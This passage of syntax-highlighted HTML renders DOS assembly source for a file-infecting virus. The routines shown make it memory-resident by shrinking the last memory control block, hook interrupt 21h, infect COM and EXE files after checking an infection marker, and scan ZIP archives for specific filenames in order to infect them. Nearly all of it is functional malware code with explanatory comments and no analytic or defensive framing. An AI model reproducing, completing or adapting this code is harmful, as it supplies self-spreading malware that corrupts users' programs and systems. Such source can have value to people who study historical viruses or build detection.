         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">install</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Allocate memory, move virus to t...</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">      </span><span class="sc1">; Get list of lists</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; AX = segment of first memory con...</span><span class="sc0">
</span><span class="sc5">next_mcb</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of current memory c...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AL = block type</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc0">              </span><span class="sc1">; Last block in chain?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">allocate_mem</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to allocate_mem</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; AX = segment of current memory c...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = size of memory block in par...</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Add size of memory block in para...</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; AX = segment of next memory cont...</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">next_mcb</span><span class="sc0">
</span><span class="sc5">allocate_mem</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = size of memory block in par...</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">*</span><span class="sc2">02h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">     </span><span class="sc1">; Store new size of memory control...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; AX = segment of last memory cont...</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Add new size of memory block in ...</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; AX = segment of virus</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES =    "    "    "</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Zero SI</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Zero DI</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; Move virus to top of memory</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">install_</span><span class="sc0">     </span><span class="sc1">; AX = offset of install_</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">

         </span><span class="sc6">retf</span><span class="sc0">            </span><span class="sc1">; Return far!</span><span class="sc0">
</span><span class="sc5">install_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">        </span><span class="sc1">; Get interrupt vector 21h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">int21_virus</span><span class="sc0">  </span><span class="sc1">; DX = offset of int21_virus</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">        </span><span class="sc1">; Set interrupt vector 21h</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">inf_com_exe</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Infect COM/EXE file</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Save BP at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">       </span><span class="sc1">; BP = stack pointer</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">      </span><span class="sc1">; Correct stack pointer</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int24_store</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">open_file</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">com_exe_exit</span><span class="sc0">    </span><span class="sc1">; Error? Jump to com_exe_exit</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">load_info</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0000000000011111b</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0000000000000001b</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">call_close</span><span class="sc0">      </span><span class="sc1">; Already infected? Jump to call_c...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of data buffer</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">      </span><span class="sc1">; Read thirty-two bytes</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_file</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = EXE signature</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'MZ'</span><span class="sc0">             </span><span class="sc1">; Found EXE signature?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">call_infect</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to call_infect</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">             </span><span class="sc1">; Found EXE signature?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">call_infect</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to call_infect</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_com</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_mark</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">call_infect</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_exe</span><span class="sc0">
</span><span class="sc5">call_mark</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_mark</span><span class="sc0">
</span><span class="sc5">call_close</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_file</span><span class="sc0">
</span><span class="sc5">com_exe_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int24_load</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; SP = stack pointer</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Load BP from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">infect_zip</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Infect ZIP archive</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Save BP at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">       </span><span class="sc1">; BP = stack pointer</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">      </span><span class="sc1">; Correct stack pointer</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Didn't found file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store didn't found CALLFAST.COM</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;   "     "      "   REQUEST.IVA</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;   "     "      "   RECEIPT.IVA</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int24_store</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">temp_file</span><span class="sc0">    </span><span class="sc1">; DX = offset of temp_file</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">0ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store file handle of !#TEMP#!</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">open_file</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">load_info_</span><span class="sc0">      </span><span class="sc1">; No error? Jump to load_info_</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">inf_zip_exit</span><span class="sc0">
</span><span class="sc5">load_info_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store file handle of ZIP file</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">load_info</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of data buffer</span><span class="sc0">
</span><span class="sc5">next_lfh_sig</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; Read four bytes</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_file</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = low-order word of file head...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'KP'</span><span class="sc0">             </span><span class="sc1">; Found low-order word of file ha...?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">test_dir_sig</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to test_dir_sig</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_mark_</span><span class="sc0">
</span><span class="sc5">test_dir_sig</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = high-order word of file hea...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">         </span><span class="sc1">; Found high-order word of central...</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">read_lfh</span><span class="sc0">        </span><span class="sc1">; Not equal? Jump to read_lfh</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">zero_cdh_num</span><span class="sc0">
</span><span class="sc5">read_lfh</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">      </span><span class="sc1">; Read twenty-six bytes</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_file</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; CX = filename length</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">      </span><span class="sc1">; DI = offset of filename</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_file_</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">request_iva</span><span class="sc0">  </span><span class="sc1">; DI = offset of request_iva</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">      </span><span class="sc1">; SI = offset of filename</span><span class="sc0">
</span><span class="sc5">request_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of filename</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; AH = byte of request_iva</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; Increase index register</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; End of filename?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_reques</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to found_reques</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; Byte of filename equal to byte o...</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_callfas</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to find_callfas</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">request_loop</span><span class="sc0">
</span><span class="sc5">found_reques</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Found REQUEST.IVA</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store found REQUEST.IVA</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_pos_cfp</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; AX = low-order word of extra field</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">22h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; DX = high-order word of extra field</span><span class="sc0">
</span><span class="sc5">find_callfas</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">callfast_com</span><span class="sc0">     </span><span class="sc1">; DI = offset of callfast_com</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">      </span><span class="sc1">; SI = offset of filename</span><span class="sc0">
</span><span class="sc5">callfas_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of filename</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; AH = byte of callfast_com</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; Increase index register</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; End of filename?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_callfa</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to found_callfa</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; Byte of filename equal to byte o...</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_receipt</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to find_receipt</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">callfas_loop</span><span class="sc0">
</span><span class="sc5">found_callfa</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Found CALLFAST.COM</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store found CALLFAST.COM</span><span class="sc0">
</span><span class="sc5">find_receipt</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">receipt_iva</span><span class="sc0">  </span><span class="sc1">; DI = offset of receipt_iva</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">      </span><span class="sc1">; SI = offset of filename</span><span class="sc0">
</span><span class="sc5">receipt_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of filename</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; AH = byte of receipt_iva</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; Increase index register</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; End of filename?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_receip</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to found_receip</span><span class="sc0">

